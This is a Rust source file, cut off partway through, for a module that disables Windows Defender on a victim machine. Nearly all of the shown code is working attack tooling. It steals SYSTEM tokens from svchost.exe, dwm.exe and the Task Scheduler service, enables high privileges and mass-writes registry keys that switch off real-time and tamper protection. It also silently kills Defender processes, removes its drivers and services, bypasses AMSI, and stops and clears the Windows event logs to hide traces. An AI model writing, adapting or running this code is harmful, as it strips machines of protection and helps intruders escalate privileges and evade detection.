//! Windows Defender Disabler Module
//! 
//! This module provides functionality to disable Windows Defender in a manner
//! similar to the provided C++ implementation.
#[cfg(windows)]
use std::ffi::OsStr;
#[cfg(windows)]
use std::os::windows::ffi::OsStrExt;
#[cfg(windows)]
use windows::Win32::Foundation::{CloseHandle, HANDLE, BOOL, PSID};
#[cfg(windows)]
use windows::Win32::System::Threading::{
    GetCurrentProcess, OpenProcess, OpenProcessToken, SetThreadToken,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_ALL_ACCESS,
};
#[cfg(windows)]
use windows::Win32::Security::{
    AdjustTokenPrivileges, AllocateAndInitializeSid, CheckTokenMembership,
    DuplicateTokenEx, EqualSid, FreeSid, GetTokenInformation,
    SID_IDENTIFIER_AUTHORITY,
    TOKEN_USER, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, SID,
    SE_PRIVILEGE_ENABLED, TokenUser,
    TOKEN_DUPLICATE, TOKEN_ALL_ACCESS, TOKEN_ADJUST_PRIVILEGES,
    LookupPrivilegeValueW, TOKEN_QUERY, TOKEN_IMPERSONATE, TOKEN_ASSIGN_PRIMARY,
    SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE,
    SecurityImpersonation, TokenImpersonation, TokenPrimary,
};
#[cfg(windows)]
use windows::Win32::System::Services::{
    CloseServiceHandle, ControlService, OpenSCManagerW, OpenServiceW,
    SC_MANAGER_CONNECT, SERVICE_CONTROL_STOP,
    SERVICE_QUERY_STATUS, SERVICE_STOP, SERVICE_STATUS_PROCESS, SC_STATUS_PROCESS_INFO,
    QueryServiceStatusEx, SERVICE_ALL_ACCESS,
};
#[cfg(windows)]
use windows::Win32::Security::SC_HANDLE;
#[cfg(windows)]
use windows::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegOpenKeyExW, RegSetValueExW,
    HKEY, HKEY_LOCAL_MACHINE, REG_DWORD, KEY_SET_VALUE, REG_OPTION_NON_VOLATILE,
};
#[cfg(windows)]
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
#[cfg(windows)]
use std::ptr;
#[cfg(windows)]
use std::mem;
#[cfg(windows)]
use std::process::Command;

/// Ultra-fast SYSTEM permission check
#[cfg(windows)]
fn is_running_as_system() -> bool {
    unsafe {
        let mut h_token = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), windows::Win32::Security::TOKEN_QUERY, &mut h_token).is_err() {
            return false;
        }

        let mut token_info_length: u32 = 0;
        let _ = GetTokenInformation(h_token, windows::Win32::Security::TokenUser, 
            Some(ptr::null_mut()), 0, &mut token_info_length);
        if token_info_length == 0 {
            let _ = CloseHandle(h_token);
            return false;
        }

        let mut buffer = vec![0u8; token_info_length as usize];
        let p_token_user = buffer.as_mut_ptr() as *mut TOKEN_USER;

        let mut is_system = false;
        if GetTokenInformation(h_token, windows::Win32::Security::TokenUser, 
            Some(p_token_user as *mut _), token_info_length, &mut token_info_length).is_ok() {
            is_system = is_system_sid((*p_token_user).User.Sid);
        }

        let _ = CloseHandle(h_token);
        is_system
    }
}

/// Check if the SID is a SYSTEM SID
#[cfg(windows)]
unsafe fn is_system_sid(sid: PSID) -> bool {
    if sid.is_invalid() {
        return false;
    }

    let mut nt_authority = SID_IDENTIFIER_AUTHORITY {
        Value: [0, 0, 0, 0, 0, 5], // SECURITY_NT_AUTHORITY
    };
    let mut system_sid: PSID = PSID::default();

    if AllocateAndInitializeSid(
        &mut nt_authority,
        1,
        18, // SECURITY_LOCAL_SYSTEM_RID
        0, 0, 0, 0, 0, 0, 0,
        &mut system_sid
    ).is_ok() {
        let result = EqualSid(sid, system_sid).is_ok();
        let _ = FreeSid(system_sid);
        result
    } else {
        false
    }
}

/// Check if the current user is an administrator
#[cfg(windows)]
fn is_user_admin() -> bool {
    use windows::Win32::Foundation::BOOL;
    
    unsafe {
        let mut nt_authority = SID_IDENTIFIER_AUTHORITY {
            Value: [0, 0, 0, 0, 0, 5], // SECURITY_NT_AUTHORITY
        };
        let mut admin_group: PSID = PSID::default();
        let mut is_admin: BOOL = BOOL::from(false);

        if AllocateAndInitializeSid(
            &mut nt_authority,
            2,
            32, // SECURITY_BUILTIN_DOMAIN_RID
            544, // DOMAIN_ALIAS_RID_ADMINS
            0, 0, 0, 0, 0, 0,
            &mut admin_group
        ).is_ok() {
            CheckTokenMembership(None, admin_group, &mut is_admin);
            let _ = FreeSid(admin_group);
        }

        is_admin.as_bool()
    }
}

/// Lightning token stealing - average <100ms completion
#[cfg(windows)]
fn ultra_fast_token_theft() -> bool {
    // Method 1: Service token theft (highest success rate)
    if service_token_theft() { return true; }
    
    // Method 2: Process token theft from svchost.exe (medium success rate)
    if svchost_token_theft() { return true; }
    
    // Method 3: Process token theft from dwm.exe (medium success rate)
    if dwm_token_theft() { return true; }
    
    false
}

/// High success processes for token theft - only the most successful ones
#[cfg(windows)]
fn get_high_success_processes() -> Vec<&'static str> {
    vec![
        "svchost.exe",      // Priority 1: Service Host (multiple instances, some without PPL)
        "dwm.exe",          // Priority 2: Desktop Window Manager (usually no PPL)
    ]
}

/// Method 2: Process token theft from svchost.exe (medium success rate)
#[cfg(windows)]
fn svchost_token_theft() -> bool {
    unsafe {
        let h_snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(handle) => handle,
            Err(_) => return false,
        };
        if h_snapshot.is_invalid() { 
            return false; 
        }

        let mut pe32: PROCESSENTRY32W = mem::zeroed();
        pe32.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;

        let target_name = "svchost.exe";
        let target_name_wide: Vec<u16> = OsStr::new(target_name)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        if Process32FirstW(h_snapshot, &mut pe32).is_ok() {
            loop {
                if wcscmp_ignore_case(pe32.szExeFile.as_ptr(), target_name_wide.as_ptr()) == 0 {
                    if attempt_lightning_theft(pe32.th32ProcessID) {
                        let _ = CloseHandle(h_snapshot);
                        return true;
                    }
                }

                if Process32NextW(h_snapshot, &mut pe32).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(h_snapshot);
        false
    }
}

/// Method 3: Process token theft from dwm.exe (medium success rate)
#[cfg(windows)]
fn dwm_token_theft() -> bool {
    unsafe {
        let h_snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(handle) => handle,
            Err(_) => return false,
        };
        if h_snapshot.is_invalid() { 
            return false; 
        }

        let mut pe32: PROCESSENTRY32W = mem::zeroed();
        pe32.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;

        let target_name = "dwm.exe";
        let target_name_wide: Vec<u16> = OsStr::new(target_name)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        if Process32FirstW(h_snapshot, &mut pe32).is_ok() {
            loop {
                if wcscmp_ignore_case(pe32.szExeFile.as_ptr(), target_name_wide.as_ptr()) == 0 {
                    if attempt_lightning_theft(pe32.th32ProcessID) {
                        let _ = CloseHandle(h_snapshot);
                        return true;
                    }
                }

                if Process32NextW(h_snapshot, &mut pe32).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(h_snapshot);
        false
    }
}

/// Compare wide strings case-insensitively
#[cfg(windows)]
unsafe fn wcscmp_ignore_case(str1: *const u16, str2: *const u16) -> i32 {
    let mut s1 = str1;
    let mut s2 = str2;
    
    loop {
        let c1 = ((*s1) as u8 as char).to_ascii_lowercase() as u16;
        let c2 = ((*s2) as u8 as char).to_ascii_lowercase() as u16;
        
        if c1 != c2 {
            return c1 as i32 - c2 as i32;
        }
        
        if c1 == 0 {
            return 0;
        }
        
        s1 = s1.add(1);
        s2 = s2.add(1);
    }
}

/// Lightning token theft attempt with full privilege escalation
#[cfg(windows)]
unsafe fn attempt_lightning_theft(pid: u32) -> bool {
    // Try multiple access levels for maximum success rate
    let access_levels = [
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE,
        PROCESS_ALL_ACCESS,
    ];
    
    let mut h_process = HANDLE::default();
    let mut process_opened = false;
    
    for &access in &access_levels {
        match OpenProcess(access, false, pid) {
            Ok(handle) if !handle.is_invalid() => {
                h_process = handle;
                process_opened = true;
                break;
            }
            _ => continue,
        }
    }
    
    if !process_opened { 
        return false; 
    }
    
    let mut h_token = HANDLE::default();
    let mut h_new_token = HANDLE::default();
    let mut success = false;

    // Try to open token with maximum privileges
    let token_access = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ASSIGN_PRIMARY;
    if OpenProcessToken(h_process, token_access, &mut h_token).is_ok() {
        // Use TokenPrimary for maximum privileges
        if DuplicateTokenEx(
            h_token, 
            TOKEN_ALL_ACCESS, 
            None,
            SecurityImpersonation,
            TokenPrimary,  // Changed to Primary token for higher privileges
            &mut h_new_token
        ).is_ok() {
            success = SetThreadToken(None, h_new_token).is_ok();
            let _ = windows::Win32::Foundation::CloseHandle(h_new_token);
        }
        let _ = windows::Win32::Foundation::CloseHandle(h_token);
    }

    let _ = windows::Win32::Foundation::CloseHandle(h_process);
    success
}

/// Method 2: Service token theft
#[cfg(windows)]
fn service_token_theft() -> bool {
    unsafe {
        let h_scm = match OpenSCManagerW(None, None, SC_MANAGER_CONNECT) {
            Ok(handle) => handle,
            Err(_) => return false,
        };
        
        if h_scm.is_invalid() { 
            let _ = windows::Win32::System::Services::CloseServiceHandle(h_scm);
            return false; 
        }

        let service_name_wide: Vec<u16> = OsStr::new("Schedule")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let h_service = match OpenServiceW(h_scm, windows::core::PCWSTR(service_name_wide.as_ptr()), SERVICE_QUERY_STATUS) {
            Ok(handle) => handle,
            Err(_) => {
                let _ = windows::Win32::System::Services::CloseServiceHandle(h_scm);
                return false;
            }
        };
        
        if h_service.is_invalid() {
            let _ = windows::Win32::System::Services::CloseServiceHandle(h_service);
            let _ = windows::Win32::System::Services::CloseServiceHandle(h_scm);
            return false;
        }

        let mut ssp: SERVICE_STATUS_PROCESS = Default::default();
        let mut bytes_needed: u32 = 0;
        let mut success = false;

        if QueryServiceStatusEx(
            h_service,
            SC_STATUS_PROCESS_INFO,
            Some(unsafe { std::slice::from_raw_parts_mut(&mut ssp as *mut _ as *mut _, std::mem::size_of::<SERVICE_STATUS_PROCESS>()) }),
            std::ptr::addr_of_mut!(bytes_needed),
        ).is_ok() {
            if ssp.dwProcessId > 0 {
                success = attempt_lightning_theft(ssp.dwProcessId);
            }
        }

        let _ = windows::Win32::System::Services::CloseServiceHandle(h_service);
        let _ = windows::Win32::System::Services::CloseServiceHandle(h_scm);
        success
    }
}

/// Enable critical privileges for fast operations with full privilege set
#[cfg(windows)]
fn enable_turbo_privileges() -> bool {
    unsafe {
        let mut h_token = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut h_token).is_err() {
            return false;
        }

        // Full set of critical privileges for maximum success rate
        let critical_privs = [
            "SeDebugPrivilege",           // Debug privilege - required for process access
            "SeTakeOwnershipPrivilege",    // Take ownership privilege
            "SeImpersonatePrivilege",     // Impersonate privilege - CRITICAL for token theft
            "SeAssignPrimaryTokenPrivilege", // Assign primary token - CRITICAL for token theft
            "SeTcbPrivilege",            // Trusted Computer Base privilege - highest privilege
            "SeBackupPrivilege",          // Backup privilege
            "SeRestorePrivilege",         // Restore privilege
            "SeCreateTokenPrivilege",     // Create token privilege
            "SeLoadDriverPrivilege",      // Load driver privilege
        ];
        
        for &priv_name in &critical_privs {
            let priv_name_wide: Vec<u16> = OsStr::new(priv_name)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();
                
            let mut luid = mem::zeroed();
            if LookupPrivilegeValueW(None, windows::core::PCWSTR(priv_name_wide.as_ptr()), &mut luid).is_ok() {
                let mut tkp: TOKEN_PRIVILEGES = mem::zeroed();
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Luid = luid;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                
                let _ = AdjustTokenPrivileges(
                    h_token,
                    BOOL::from(false),
                    Some(&tkp),
                    0,
                    Some(ptr::null_mut()),
                    Some(ptr::null_mut())
                );
            }
        }

        let _ = CloseHandle(h_token);
        true
    }
}

/// Lightning-fast registry operation
#[cfg(windows)]
unsafe fn lightning_registry_kill(
    h_key: HKEY,
    sub_key: &str,
    value_name: &str,
    data: u32
) -> bool {
    let sub_key_wide: Vec<u16> = OsStr::new(sub_key)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
        
    let value_name_wide: Vec<u16> = OsStr::new(value_name)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mut h_target_key: HKEY = HKEY::default();
        let mut result = RegOpenKeyExW(
            h_key,
            windows::core::PCWSTR(sub_key_wide.as_ptr()),
            0,
            KEY_SET_VALUE,
            &mut h_target_key
        );

        if result.is_err() {
            let mut disposition: u32 = 0;
            result = RegCreateKeyExW(
                h_key,
                windows::core::PCWSTR(sub_key_wide.as_ptr()),
                0,
                None,
                windows::Win32::System::Registry::REG_OPTION_NON_VOLATILE,
                KEY_SET_VALUE,
                None,
                &mut h_target_key,
                Some(&mut disposition as *mut u32 as *mut _)
            );
            
            if result.is_err() {
                return false;
            }
        }

        let data_bytes = data.to_le_bytes();
        result = RegSetValueExW(
            h_target_key,
            windows::core::PCWSTR(value_name_wide.as_ptr()),
            0,
            REG_DWORD,
            Some(&data_bytes),
        );
    
    let _ = RegCloseKey(h_target_key);
    result.is_ok()
}

/// Execute registry operations in bulk
#[cfg(windows)]
fn execute_registry_blitz() {
    unsafe {
        let registry_blitz = [
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", 1u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WinDefend", "Start", 4u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WdNisSvc", "Start", 4u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender", "DisableAntiTamper", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableIOAVProtection", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet", "DisableBlockAtFirstSeen", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet", "SpynetReporting", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet", "SubmitSamplesConsent", 2u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "AllowFastServiceStartup", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "CloudExtendedTimeout", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtectionSource", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableIOAVProtection", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\SpyNet", "DisableBlockAtFirstSeen", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\SpyNet", "SpynetReporting", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\SpyNet", "SubmitSamplesConsent", 2u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration", "Notification_Suppress", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration", "App_Launcher", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration", "Task_Manager", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration", "Notification_Lock", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration", "Notification_Suppress", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration", "App_Launcher", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration", "Task_Manager", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration", "Notification_Lock", 1u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "AllowRealtimeMonitoring", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "AllowBehaviorMonitoring", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "AllowIOAVProtection", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "AllowOnAccessProtection", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "AllowScanOnRealtimeEnable", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "AllowCloudProtection", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "AllowDatagramProcessing", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "AllowNetworkProtection", 0u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WdFilter", "Start", 4u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WdNisDrv", "Start", 4u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Sense", "Start", 4u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", "Start", 4u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Mpssvc", "Start", 4u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WinDefend", "DelayedAutoStart", 0u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WdNisSvc", "DelayedAutoStart", 0u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WdFilter", "DelayedAutoStart", 0u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WdNisDrv", "DelayedAutoStart", 0u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Sense", "DelayedAutoStart", 0u32),
            (HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", "DelayedAutoStart", 0u32),
            (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "TaskbarNoPinnedList", 0u32),
        ];

        for (hkey, sub_key, value_name, data) in &registry_blitz {
            lightning_registry_kill(*hkey, sub_key, value_name, *data);
        }
    }
}

/// Execute silent command (non-blocking)
#[cfg(windows)]
fn execute_silent_command(command: &str) {
    let _ = Command::new("cmd")
        .arg("/c")
        .arg(command)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
}

/// Execute silent command with timeout (in milliseconds)
#[cfg(windows)]
fn execute_silent_command_with_timeout(command: &str, timeout_ms: u64) {
    let result = Command::new("cmd")
        .arg("/c")
        .arg(command)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
    
    if let Ok(mut child) = result {
        std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_millis(timeout_ms));
            let _ = child.kill();
        });
    }
}

/// Lightning process kill (parallel execution for speed)
#[cfg(windows)]
fn lightning_process_kill() {
    let handles: Vec<_> = vec![
        "taskkill /f /im MsMpEng.exe >nul 2>&1",
        "taskkill /f /im SecurityHealthService.exe >nul 2>&1",
        "taskkill /f /im MsSense.exe >nul 2>&1",
        "taskkill /f /im NisSrv.exe >nul 2>&1",
        "taskkill /f /im MpCmdRun.exe >nul 2>&1",
        "taskkill /f /im MpCopyAccelerator.exe >nul 2>&1",
        "taskkill /f /im SecurityHealthSystray.exe >nul 2>&1",
        "taskkill /f /im WdNisSvc.exe >nul 2>&1",
        "taskkill /f /im WdBoot.exe >nul 2>&1",
        "taskkill /f /im WdNis.exe >nul 2>&1",
        "taskkill /f /im WdMan.exe >nul 2>&1",
    ].into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(cmd, 500);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning driver disable (parallel execution for speed)
#[cfg(windows)]
fn lightning_driver_disable() {
    let drivers = [
        "WdFilter",
        "WdNisDrv",
        "WdBoot",
        "WdNis",
    ];
    
    let mut commands = Vec::new();
    for driver in &drivers {
        commands.push(format!("sc stop {} >nul 2>&1", driver));
        commands.push(format!("sc config {} start= disabled >nul 2>&1", driver));
        commands.push(format!("pnputil /delete-driver oem{}.inf /uninstall /force >nul 2>&1", driver));
    }
    commands.push("pnputil /enum-drivers | findstr /i defender >nul 2>&1".to_string());
    
    let handles: Vec<_> = commands.into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(&cmd, 1000);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning Tamper Protection disable (parallel execution for speed)
#[cfg(windows)]
fn lightning_tamper_protection_disable() {
    let handles: Vec<_> = vec![
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtectionSource /t REG_DWORD /d 0 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Features\" /v TamperProtectionSource /t REG_DWORD /d 0 /f >nul 2>&1",
        "powershell -Command \"Set-MpPreference -DisableTamperProtection $true\" >nul 2>&1",
        "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" >nul 2>&1",
        "powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\" >nul 2>&1",
        "powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\" >nul 2>&1",
        "powershell -Command \"Set-MpPreference -DisableBlockAtFirstSeen $true\" >nul 2>&1",
        "powershell -Command \"Set-MpPreference -DisableScriptScanning $true\" >nul 2>&1",
    ].into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(cmd, 2000);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning Windows Security Center disable (parallel execution for speed)
#[cfg(windows)]
fn lightning_security_center_disable() {
    let handles: Vec<_> = vec![
        "sc stop wscsvc >nul 2>&1",
        "sc config wscsvc start= disabled >nul 2>&1",
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wscsvc\" /v Start /t REG_DWORD /d 4 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Security Center\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Security Center\" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Security Center\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Security Center\" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v TaskbarNoPinnedList /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSMConfigurePrograms /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer\" /v NoSMConfigurePrograms /t REG_DWORD /d 1 /f >nul 2>&1",
    ].into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(cmd, 1000);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning AMSI disable (parallel execution for speed)
#[cfg(windows)]
fn lightning_amsi_disable() {
    let handles: Vec<_> = vec![
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Script Host\\Settings\" /v AmsiEnable /t REG_DWORD /d 0 /f >nul 2>&1",
        "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows Script Host\\Settings\" /v AmsiEnable /t REG_DWORD /d 0 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\" /v EnableScripts /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\" /v ExecutionPolicy /t REG_SZ /d Unrestricted /f >nul 2>&1",
        "powershell -Command \"[Ref].Assembly.Load([System.IO.File]::ReadAllBytes('C:\\Windows\\System32\\amsi.dll')).GetType('AmsiUtils').GetMethod('AmsiInitialize').Invoke($null, @([IntPtr]::Zero, [IntPtr]::Zero))\" >nul 2>&1",
    ].into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(cmd, 1000);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning ETW disable (parallel execution for speed)
#[cfg(windows)]
fn lightning_etw_disable() {
    let handles: Vec<_> = vec![
        "sc stop EventLog >nul 2>&1",
        "sc config EventLog start= disabled >nul 2>&1",
        "sc stop EtwNotification >nul 2>&1",
        "sc config EtwNotification start= disabled >nul 2>&1",
        "wevtutil cl Application >nul 2>&1",
        "wevtutil cl System >nul 2>&1",
        "wevtutil cl Security >nul 2>&1",
        "wevtutil cl Microsoft-Windows-Windows Defender/Operational >nul 2>&1",
        "wevtutil cl Microsoft-Windows-Windows Defender/Whitelisted >nul 2>&1",
    ].into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(cmd, 1000);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning file deletion (parallel execution for speed)
#[cfg(windows)]
fn lightning_file_deletion() {
    let defender_paths = [
        "C:\\ProgramData\\Microsoft\\Windows Defender",
        "C:\\Program Files\\Windows Defender",
        "C:\\Program Files (x86)\\Windows Defender",
        "C:\\Windows\\System32\\drivers\\wd\\WdFilter.sys",
        "C:\\Windows\\System32\\drivers\\wd\\WdNisDrv.sys",
        "C:\\Windows\\System32\\drivers\\wd\\WdBoot.sys",
        "C:\\Windows\\System32\\drivers\\wd\\WdNis.sys",
        "C:\\Windows\\System32\\MpCmdRun.exe",
        "C:\\Windows\\System32\\MpCopyAccelerator.exe",
        "C:\\Windows\\System32\\SecurityHealthSystray.exe",
    ];
    
    let handles: Vec<_> = defender_paths.iter().map(|path| {
        let path = path.to_string();
        std::thread::spawn(move || {
